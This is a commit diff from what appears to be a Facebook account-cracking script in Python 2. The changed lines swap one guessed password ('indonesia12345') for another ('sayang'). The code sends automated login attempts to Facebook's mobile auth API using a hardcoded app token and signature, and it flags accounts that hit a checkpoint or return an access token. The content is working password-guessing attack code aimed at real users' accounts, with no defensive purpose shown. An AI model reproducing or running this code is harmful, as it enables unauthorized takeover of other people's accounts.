ca8c0ae2ce08815a47a3b72c4047f72c9f9ed46f
zhlantos <51984728+zhlantos@users.noreply.github.com>
2019-06-20 08:09:58 +0700

    Add files via upload

--- beta.py
+++ beta.py
@@ -669,7 +669,7 @@ def pilih_super():
 																if 'www.facebook.com' in q['error_msg']:
 																	print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass7
 																else:
-																	pass8 = 'indonesia' + '12345'
+																	pass8 = 'sayang'
 																	data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 																	q = json.load(data)
 																	if 'access_token' in q:
